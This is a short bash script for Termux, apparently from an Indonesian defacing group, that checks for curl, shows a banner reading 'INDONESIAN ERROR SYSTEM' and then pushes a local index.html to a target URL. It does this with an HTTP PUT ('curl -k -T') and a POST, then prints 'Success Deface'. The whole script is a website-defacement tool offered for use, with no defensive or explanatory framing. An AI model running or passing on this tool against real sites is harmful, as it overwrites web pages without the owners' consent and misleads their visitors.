#!/bin/bash

### Color ###
{
white='\e[1;37m'
red='\e[1;31m'
blue='\e[0;34m'
lightgreen='\e[1;32m'
}

if [ -f /data/data/com.termux/files/usr/bin/curl ];
then 
    sleep 1
    echo -e $blue"[✔]:[ curl ]: $lightgreen Found !" 
else
    echo -e $blue"[x]:[ curl ]: $red Not Found ! "
    echo ""
    sleep 1 
    echo -e $white"installing curl..."
    sleep 1
    apt-get install --force-yes -y curl
fi

echo ""
sleep 1
echo "installation Finished"
echo ""
sleep 1
clear


echo -e $red"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo -e $blue"   __  ____  ___      __    __  __  ____  _____    ____  ____  ____  __    ___  ____ "$red"+"
echo -e $blue"(_  _)( ___)/ __)    /__\  (  )(  )(_  _)(  _  )  (  _ \( ___)( ___)/__\  / __)( ___)"$red"+"
echo -e $blue" _)(_  )__) \__ \   /(__)\  )(__)(   )(   )(_)(    )(_) ))__)  )__)/(__)\( (__  )__) "$red"+"
echo -e $blue"(____)(____)(___/  (__)(__)(______) (__) (_____)  (____/(____)(__)(__)(__)\___)(____)"$red"+"
echo -e $red"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"                                                                                                             
echo -e $white"INDONESIAN ERROR SYSTEM"
echo -e $white''
if [ -z "$1" ]; then
        echo -e $red"["$lightgreen"+"$red"]"$white"Usage Deface curl."
        echo -e $red"["$lightgreen"+"$red"]"$white"Use: $red$0 $white<URL>"
        exit 0
fi

echo
curl -k -T index.html $1
curl -k -X POST -F index.html $1
echo -e $blue"Success Deface $red"$1"/index.html"
